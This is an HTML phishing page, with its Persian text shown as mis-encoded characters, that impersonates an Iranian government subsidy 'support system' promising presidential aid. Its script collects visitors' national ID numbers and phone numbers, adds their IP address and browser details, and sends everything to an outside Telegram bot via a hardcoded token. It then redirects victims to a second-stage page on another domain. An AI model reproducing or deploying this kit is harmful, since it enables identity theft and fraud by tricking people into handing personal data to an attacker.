<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø³Ø§Ù…Ø§Ù†Ù‡ Ø­Ù…Ø§ÛŒØª</title>
    <!-- Ù„ÛŒÙ†Ú© ÙÙˆÙ†Øªâ€ŒÙ‡Ø§ÛŒ Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        h1 {
            font-size: 24px;
            color: #1a73e8;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 16px;
            color: #4a90e2;
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border: 2px solid #4a90e2;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.3s ease;
        }
        input:focus {
            border-color: #1a73e8;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #1557b0;
        }
        .footer {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
        }
        .info-box {
            background-color: #f0f4ff;
            padding: 10px;
            border-radius: 8px;
            margin-top: 15px;
            text-align: left;
            font-size: 12px;
            color: #333;
        }
        .connection-status {
            margin-top: 10px;
            font-size: 12px;
            color: #666;
        }
        .error-message {
            color: #dc3545;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ø³Ø§Ù…Ø§Ù†Ù‡ Ø­Ù…Ø§ÛŒØª</h1>
        <h2>Ú©Ù…Ú© Ø±Ø¦ÛŒØ³ Ø¬Ù…Ù‡ÙˆØ± Ø¨Ù‡ Ø¯Ù‡Ú©â€ŒÙ‡Ø§ÛŒ Û± ØªØ§ Û·</h2>
        <form id="supportForm">
            <input type="text" id="nationalCode" name="nationalCode" placeholder="Ú©Ø¯ Ù…Ù„ÛŒ Ø³Ø±Ù¾Ø±Ø³Øª" required>
            <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ† Ø³Ø±Ù¾Ø±Ø³Øª" required>
            <button type="submit">ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø³Ø§Ù…Ø§Ù†Ù‡</button>
        </form>
        <div id="errorMessage" class="error-message"></div>
        <div class="info-box">
            <p>Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø´Ù…Ø§:</p>
            <p>Ú©Ø¯ Ù…Ù„ÛŒ: <span id="displayNationalCode">-</span></p>
            <p>Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ†: <span id="displayPhoneNumber">-</span></p>
        </div>
        <p class="footer">Ø­Ù‚ÙˆÙ‚ Ø§ÛŒÙ† Ø³Ø§Ù…Ø§Ù†Ù‡ Ù…ØªØ¹Ù„Ù‚ Ø¨Ù‡ Ø³Ø§Ø²Ù…Ø§Ù† Ù‡Ø¯ÙÙ…Ù†Ø¯Ø³Ø§Ø²ÛŒ ÛŒØ§Ø±Ø§Ù†Ù‡â€ŒÙ‡Ø§ Ù…ÛŒâ€ŒØ¨Ø§Ø´Ø¯.</p>
        <div id="connectionStatus" class="connection-status">
            ÙˆØ¶Ø¹ÛŒØª Ø§ØªØµØ§Ù„: <span id="statusText">Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ...</span>
        </div>
    </div>

    <script>
        // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ú©Ø¯ Ù…Ù„ÛŒ (Û±Û° Ø±Ù‚Ù… Ùˆ ÙÙ‚Ø· Ø¹Ø¯Ø¯)
        function validateNationalCode(nationalCode) {
            return /^\d{10}$/.test(nationalCode);
        }

        // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ† (Û±Û± Ø±Ù‚Ù… Ùˆ Ø´Ø±ÙˆØ¹ Ø¨Ø§ Û°Û¹)
        function validatePhoneNumber(phoneNumber) {
            return /^09\d{9}$/.test(phoneNumber);
        }

        // Ù†Ù…Ø§ÛŒØ´ Ù¾ÛŒØ§Ù… Ø®Ø·Ø§
        function showError(message) {
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }

        // Ù…Ø®ÙÛŒ Ú©Ø±Ø¯Ù† Ù¾ÛŒØ§Ù… Ø®Ø·Ø§
        function hideError() {
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.style.display = 'none';
        }

        // Ø§Ø±Ø³Ø§Ù„ ÙØ±Ù… Ùˆ Ù‡Ø¯Ø§ÛŒØª Ø¨Ù‡ ØµÙØ­Ù‡ Ø¯ÙˆÙ…
        document.getElementById('supportForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² Ø§Ø±Ø³Ø§Ù„ ÙØ±Ù… Ø¨Ù‡ ØµÙˆØ±Øª Ù¾ÛŒØ´â€ŒÙØ±Ø¶

            // Ø¯Ø±ÛŒØ§ÙØª Ù…Ù‚Ø§Ø¯ÛŒØ±
            const nationalCode = document.getElementById('nationalCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value;

            // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ú©Ø¯ Ù…Ù„ÛŒ Ùˆ Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ†
            if (!validateNationalCode(nationalCode)) {
                showError('Ú©Ø¯ Ù…Ù„ÛŒ Ù†Ø§Ù…Ø¹ØªØ¨Ø± Ø§Ø³Øª! Ù„Ø·ÙØ§Ù‹ ÛŒÚ© Ú©Ø¯ Ù…Ù„ÛŒ Û±Û° Ø±Ù‚Ù…ÛŒ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯.');
                return;
            }
            if (!validatePhoneNumber(phoneNumber)) {
                showError('Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ† Ù†Ø§Ù…Ø¹ØªØ¨Ø± Ø§Ø³Øª! Ù„Ø·ÙØ§Ù‹ ÛŒÚ© Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ† Û±Û± Ø±Ù‚Ù…ÛŒ Ø´Ø±ÙˆØ¹ Ø¨Ø§ Û°Û¹ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯.');
                return;
            }

            // Ù…Ø®ÙÛŒ Ú©Ø±Ø¯Ù† Ù¾ÛŒØ§Ù… Ø®Ø·Ø§ (Ø§Ú¯Ø± Ù‚Ø¨Ù„Ø§Ù‹ Ù†Ù…Ø§ÛŒØ´ Ø¯Ø§Ø¯Ù‡ Ø´Ø¯Ù‡ Ø¨ÙˆØ¯)
            hideError();

            // Ø¯Ø±ÛŒØ§ÙØª Ø¢ÛŒÙ¾ÛŒ Ú©Ø§Ø±Ø¨Ø±
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const userIP = data.ip;

            // Ø¯Ø±ÛŒØ§ÙØª User Agent Ú©Ø§Ø±Ø¨Ø±
            const userAgent = navigator.userAgent;

            // Ø¯Ø±ÛŒØ§ÙØª Ø²Ù…Ø§Ù† ÙØ¹Ù„ÛŒ
            const now = new Date();
            const time = now.toLocaleString('fa-IR', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
            });

            // Ø³Ø§Ø®Øª Ù¾ÛŒØ§Ù… Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø±Ø¨Ø§Øª ØªÙ„Ú¯Ø±Ø§Ù…
            const message = `
ğŸ“„ *Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¬Ø¯ÛŒØ¯ Ø§Ø² ØµÙØ­Ù‡ Ø§ÙˆÙ„:*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ†” *Ú©Ø¯ Ù…Ù„ÛŒ:* \`${nationalCode}\`
ğŸ“ *Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ†:* \`${phoneNumber}\`
ğŸŒ *Ø¢ÛŒÙ¾ÛŒ Ú©Ø§Ø±Ø¨Ø±:* \`${userIP}\`
ğŸ•’ *Ø²Ù…Ø§Ù† Ø§Ø±Ø³Ø§Ù„:* \`${time}\`
ğŸ› ï¸ *User Agent:* \`${userAgent}\`
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ‘¤ *Ø³Ø§Ø²Ù†Ø¯Ù‡:* [@YourUsername](https://t.me/YourUsername)
            `;

            // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ø¨Ù‡ Ø±Ø¨Ø§Øª ØªÙ„Ú¯Ø±Ø§Ù…
            const token = '7326413003:AAHSXZQox1VOyQ'; // ØªÙˆÚ©Ù† Ø±Ø¨Ø§Øª Ø®ÙˆØ¯ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ù‚Ø±Ø§Ø± Ø¯Ù‡ÛŒØ¯
            const chatId = '57281'; // Ø¢ÛŒØ¯ÛŒ Ú†Øª Ø®ÙˆØ¯ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ù‚Ø±Ø§Ø± Ø¯Ù‡ÛŒØ¯
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                }),
            };

            fetch(url, options)
                .then(response => response.json())
                .then(result => {
                    console.log('Ù¾Ø§Ø³Ø® Ø³Ø±ÙˆØ± ØªÙ„Ú¯Ø±Ø§Ù…:', result);
                    if (result.ok) {
                        console.log('Ù¾ÛŒØ§Ù… Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯:', result);
                        // Ù‡Ø¯Ø§ÛŒØª Ø¨Ù‡ ØµÙØ­Ù‡ Ø¯ÙˆÙ…
                        window.location.href = `https://newwi.news/m/page2.html?nationalCode=${encodeURIComponent(nationalCode)}&phoneNumber=${encodeURIComponent(phoneNumber)}`;
                    } else {
                        console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…:', result);
                        showError('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª! Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†ÛŒØ¯.');
                    }
                })
                .catch(error => {
                    console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…:', error);
                    showError('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª! Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†ÛŒØ¯.');
                });
        });
    </script>
</body>
</html>